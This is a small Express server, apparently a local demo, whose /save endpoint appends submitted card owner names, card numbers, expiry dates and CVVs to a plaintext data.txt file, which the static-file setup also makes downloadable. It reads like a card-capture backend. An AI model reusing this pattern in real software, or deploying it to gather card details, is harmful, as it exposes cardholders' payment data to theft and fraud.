const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

const filePath = path.join(__dirname, 'data.txt');

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/save', (req, res) => {
  const { owner, cardNumber, expValue, cvvValue } = req.body;
  const line = `owner=${owner} | card=${cardNumber} | exp=${expValue} | cvv=${cvvValue}
`;

  fs.appendFile(filePath, line, (err) => {
    if (err) return res.status(500).send('error');
    res.send('ok');
  });
});

app.listen(5555, '127.0.0.1', () => console.log('http://127.0.0.1:5555'));
